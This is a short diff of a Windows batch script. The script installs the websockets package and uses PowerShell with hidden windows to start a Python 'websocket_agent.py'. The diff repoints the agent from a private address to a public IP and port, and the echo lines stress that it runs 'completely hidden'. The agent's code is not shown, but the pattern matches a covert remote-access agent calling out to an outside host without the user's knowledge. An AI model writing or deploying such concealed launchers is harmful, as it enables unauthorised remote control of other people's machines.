@@ -13,7 +13,7 @@ pip install websockets
 
 REM Start the Python agent completely hidden using PowerShell
 echo Starting Python agent completely hidden...
-powershell -WindowStyle Hidden -Command "$process = Start-Process python -ArgumentList 'websocket_agent.py', '192.168.129.23', '8888', 'test' -WindowStyle Hidden -PassThru; Write-Output $process.Id"
+powershell -WindowStyle Hidden -Command "$process = Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden -PassThru; Write-Output $process.Id"
 
 echo Agent started successfully!
 echo The Python agent is now running completely hidden.
